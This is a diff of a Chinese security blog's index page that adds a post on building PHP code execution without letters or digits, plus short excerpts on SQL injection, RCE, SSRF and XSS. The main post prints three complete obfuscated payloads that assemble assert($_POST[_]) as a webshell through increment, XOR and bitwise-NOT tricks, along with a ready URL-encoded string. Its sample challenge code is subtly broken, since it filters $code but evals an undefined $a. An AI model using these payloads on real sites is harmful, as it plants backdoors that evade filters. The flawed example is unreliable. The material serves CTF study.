@@ -145,6 +145,223 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-无字符rce" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/03/01/%E6%97%A0%E5%AD%97%E7%AC%A6rce/">无字符rce</a>
+    </h1>
+  
+
+        
+        <a href="/2021/03/01/%E6%97%A0%E5%AD%97%E7%AC%A6rce/" class="archive-article-date">
+  	<time datetime="2021-02-28T17:26:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>($a);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><strong>递增运算</strong></p>
+<p>借助PHP的一个小技巧，PHP中可以递增，当字母<code>a</code>经过自增就可以变换为<code>b</code>,<code>A</code>可以变成<code>B</code>。也就是说，如果我们可以获取到a和A，就可以通过自增获取到所有的字母与数字。而数组是Array，刚好可以得到A和a，其实拿那两个字符都不重要，只是获取到这两个，可以让我们更方便使用而已。获取数组可以通过数组与字符串的转换实现。</p>
+<p><img src="https://tvax2.sinaimg.cn/large/007OtlCngy1go3rj8gvjij30uh04cweq.jpg" alt="image-20210224124300975"></p>
+<p>放一个网上的脚本，无字符rce，通过<code>&#39;!&#39;==&#39;@&#39;</code>获取到false 0，然后再通过自增，获取到相应的字母，之后执行<code>ASSERT($_POST[_])</code>,由于php大小写不敏感所以大小写都无所谓。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$_=[];</span></span><br><span class="line"><span class="php">$_=@<span class="string">"$_"</span>; <span class="comment">// $_='Array';</span></span></span><br><span class="line"><span class="php">$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]; <span class="comment">// $_=$_[0];</span></span></span><br><span class="line"><span class="php">$___=$_; <span class="comment">// A</span></span></span><br><span class="line"><span class="php">$__=$_;</span></span><br><span class="line"><span class="php">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span></span><br><span class="line"><span class="php">$___.=$__; <span class="comment">// S</span></span></span><br><span class="line"><span class="php">$___.=$__; <span class="comment">// S</span></span></span><br><span class="line"><span class="php">$__=$_;</span></span><br><span class="line"><span class="php">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span></span><br><span class="line"><span class="php">$___.=$__;</span></span><br><span class="line"><span class="php">$__=$_;</span></span><br><span class="line"><span class="php">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span></span><br><span class="line"><span class="php">$___.=$__;</span></span><br><span class="line"><span class="php">$__=$_;</span></span><br><span class="line"><span class="php">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span></span><br><span class="line"><span class="php">$___.=$__;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$____=<span class="string">'_'</span>;</span></span><br><span class="line"><span class="php">$__=$_;</span></span><br><span class="line"><span class="php">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span></span><br><span class="line"><span class="php">$____.=$__;</span></span><br><span class="line"><span class="php">$__=$_;</span></span><br><span class="line"><span class="php">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span></span><br><span class="line"><span class="php">$____.=$__;</span></span><br><span class="line"><span class="php">$__=$_;</span></span><br><span class="line"><span class="php">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span></span><br><span class="line"><span class="php">$____.=$__;</span></span><br><span class="line"><span class="php">$__=$_;</span></span><br><span class="line"><span class="php">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span></span><br><span class="line"><span class="php">$____.=$__;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$_=$$____;</span></span><br><span class="line"><span class="php">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><strong>异或</strong></p>
+<p>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>); <span class="comment">// $_='assert';</span></span></span><br><span class="line"><span class="php">$__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>); <span class="comment">// $__='_POST';</span></span></span><br><span class="line"><span class="php">$___=$$__;</span></span><br><span class="line"><span class="php">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span></span><br></pre></td></tr></table></figure>
+
+<p>由于存在不可显字符，所以使用了url编码</p>
+<p>最终的url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;);$__&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);$___&#x3D;$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p><strong>取反</strong></p>
+<p>方法二三其实思路差不多，方法二使用的是位运算里的“异或”，方法三使用的是位运算里的“取反”。<br>方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;[2]</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：<br>一般利用汉字，因为汉字的uniocode占3字节。可以利用其构造字母。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_++;   &#x2F;&#x2F;得到1，此时$_&#x3D;1</span><br><span class="line">$__ &#x3D; &quot;极&quot;;</span><br><span class="line">$___ &#x3D; ~($__&#123;$_&#125;);   &#x2F;&#x2F;得到a，此时$___&#x3D;&quot;a&quot;</span><br><span class="line">$__ &#x3D; &quot;区&quot;;</span><br><span class="line">$___ .&#x3D; ~($__&#123;$_&#125;);   &#x2F;&#x2F;得到s，此时$___&#x3D;&quot;as&quot;</span><br><span class="line">$___ .&#x3D; ~($__&#123;$_&#125;);   &#x2F;&#x2F;此时$___&#x3D;&quot;ass&quot;</span><br><span class="line">$__ &#x3D; &quot;皮&quot;;</span><br><span class="line">$___ .&#x3D; ~($__&#123;$_&#125;);   &#x2F;&#x2F;得到e，此时$___&#x3D;&quot;asse&quot;</span><br><span class="line">$__ &#x3D; &quot;十&quot;;</span><br><span class="line">$___ .&#x3D; ~($__&#123;$_&#125;);   &#x2F;&#x2F;得到r，此时$___&#x3D;&quot;asser&quot;</span><br><span class="line">$__ &#x3D; &quot;勺&quot;;</span><br><span class="line">$___ .&#x3D; ~($__&#123;$_&#125;);   &#x2F;&#x2F;得到t，此时$___&#x3D;&quot;assert&quot;</span><br><span class="line">$____ &#x3D; &#39;_&#39;;   &#x2F;&#x2F;$____&#x3D;&#39;_&#39;</span><br><span class="line">$__ &#x3D; &quot;寸&quot;;</span><br><span class="line">$____ .&#x3D; ~($__&#123;$_&#125;);   &#x2F;&#x2F;得到P，此时$____&#x3D;&quot;_P&quot;</span><br><span class="line">$__ &#x3D; &quot;小&quot;;</span><br><span class="line">$____ .&#x3D; ~($__&#123;$_&#125;);   &#x2F;&#x2F;得到O，此时$____&#x3D;&quot;_PO&quot;</span><br><span class="line">$__ &#x3D; &quot;欠&quot;;</span><br><span class="line">$____ .&#x3D; ~($__&#123;$_&#125;);   &#x2F;&#x2F;得到S，此时$____&#x3D;&quot;_POS&quot;</span><br><span class="line">$__ &#x3D; &quot;立&quot;;</span><br><span class="line">$____ .&#x3D; ~($__&#123;$_&#125;);   &#x2F;&#x2F;得到T，此时$____&#x3D;&quot;_POST&quot;</span><br><span class="line">$_ &#x3D; $$____;   &#x2F;&#x2F;$_ &#x3D; $_POST</span><br><span class="line">$___($_[_]);   &#x2F;&#x2F;assert($_POST[_])</span><br></pre></td></tr></table></figure>
+
+<p>以上就是在php5中可以使用的无字符rce了。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/03/01/%E6%97%A0%E5%AD%97%E7%AC%A6rce/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-sql注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/23/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/23/sql%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2021-02-22T18:06:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-23</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>注释符号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#    &#x2F;*    --     ;%00      &#96;(反引号，只能在语句最后使用)</span><br></pre></td></tr></table></figure>
+        
+          <a class="article-more-a" href="/2021/02/23/sql%E6%B3%A8%E5%85%A5/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/23/sql%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-RCE" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/22/RCE/">RCE</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/22/RCE/" class="archive-article-date">
+  	<time datetime="2021-02-22T01:57:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-22</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="代码执行原理"><a href="#代码执行原理" class="headerlink" title="代码执行原理"></a>代码执行原理</h2><p>代码的执行来自于缺乏严格的过滤或者用户控制数据的逃逸。在这里由于攻击者可以控制部分或者所有内容传递给这些未进行严格过滤的函数，从而导致提交的内容会被作为PHP代码执行。如PHP的eval函数，可以将字符串代表的代码作为PHP代码执行，当用户能够控制这段字符串时，将产生代码注入漏洞（也称命令执行）。</p>
+        
+          <a class="article-more-a" href="/2021/02/22/RCE/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/22/RCE/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-OpenSSL漏洞复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -576,206 +793,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2020/09/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SSRF" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/17/SSRF/">SSRF</a>
-    </h1>
-  
-
-        
-        <a href="/2020/08/17/SSRF/" class="archive-article-date">
-  	<time datetime="2020-08-17T04:36:34.967Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
-        
-          <a class="article-more-a" href="/2020/08/17/SSRF/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/08/17/SSRF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-独孤九剑" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/16/%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/">独孤九剑</a>
-    </h1>
-  
-
-        
-        <a href="/2020/08/16/%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/" class="archive-article-date">
-  	<time datetime="2020-08-15T20:31:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>对于第一题，过滤了<code>()=,</code>让我们加载js，首先想到使用<code>&lt;svg&gt;</code>标签，但是我直接把编码过的数据放进去，然后让它执行。</p>
-<p>HTML实体编码：<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p>
-        
-          <a class="article-more-a" href="/2020/08/16/%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/08/16/%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-一次完整的http请求" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/12/%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84http%E8%AF%B7%E6%B1%82/">一次完整的http请求</a>
-    </h1>
-  
-
-        
-        <a href="/2020/08/12/%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84http%E8%AF%B7%E6%B1%82/" class="archive-article-date">
-  	<time datetime="2020-08-11T20:01:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="1-域名解析"><a href="#1-域名解析" class="headerlink" title="1.域名解析"></a>1.域名解析</h1><p>域名解析，解析出对应的IP地址。</p>
-<p><strong>那是如何解析的呢？</strong></p>
-<ol>
-<li><p>首先会搜索浏览器自身的DNS缓存</p>
-<p>为了加快访问速度，Google Chrome浏览器采用了预提DNS记录，在本地建立DNS缓存的方法，加快网站的连接速度。</p></li></ol>
-        
-          <a class="article-more-a" href="/2020/08/12/%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84http%E8%AF%B7%E6%B1%82/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/08/12/%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84http%E8%AF%B7%E6%B1%82/">展开全文 >></a>
         </p>
       
 
